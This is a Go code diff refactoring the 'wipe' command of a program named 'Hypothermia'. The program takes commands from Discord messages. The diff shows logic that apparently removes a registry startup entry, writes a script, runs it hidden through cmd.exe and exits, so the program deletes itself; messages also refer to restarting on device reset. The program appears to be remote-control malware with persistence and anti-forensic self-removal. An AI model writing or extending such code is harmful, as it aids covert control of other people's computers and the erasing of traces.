@@ -25,7 +25,7 @@ const (
 	wipeSoftKill string = "🟩 Hypothermia soft killed, will startup on device reset."
 )
 
-func (*WipeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) error {
+func (*WipeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
 	var kill bool = false
 	if len(args) == 1 {
 		kill = true
@@ -50,15 +50,15 @@ func (*WipeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args [
 		)
 
 		if err != nil && !checked {
-			_, err := s.ChannelMessageSendReply(m.ChannelID, wipeDeReglError, m.Reference())
-			return err
+			s.ChannelMessageSendReply(m.ChannelID, wipeDeReglError, m.Reference())
+			return
 		}
 	}
 
 	path, err := os.Executable()
 	if err != nil {
-		_, err := s.ChannelMessageSendReply(m.ChannelID, wipePathError, m.Reference())
-		return err
+		s.ChannelMessageSendReply(m.ChannelID, wipePathError, m.Reference())
+		return
 	}
 
 	path, _ = filepath.Abs(path)
@@ -87,8 +87,8 @@ func (*WipeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args [
 
 	err = os.WriteFile(script, []byte(content), 0644)
 	if err != nil {
-		_, err := s.ChannelMessageSendReply(m.ChannelID, fmt.Sprint(wipeDelError, err), m.Reference())
-		return err
+		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprint(wipeDelError, err), m.Reference())
+		return
 	}
 
 	cmd := exec.Command("cmd.exe", "/C", "start", "/b", script)
@@ -98,14 +98,13 @@ func (*WipeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args [
 
 	err = cmd.Start()
 	if err != nil {
-		_, err := s.ChannelMessageSendReply(m.ChannelID, wipeKillError, m.Reference())
-		return err
+		s.ChannelMessageSendReply(m.ChannelID, wipeKillError, m.Reference())
+		return
 	}
 
 	time.Sleep(500 * time.Millisecond)
 
 	os.Exit(0)
-	return nil
 }
 
 func (*WipeCommand) Name() string {
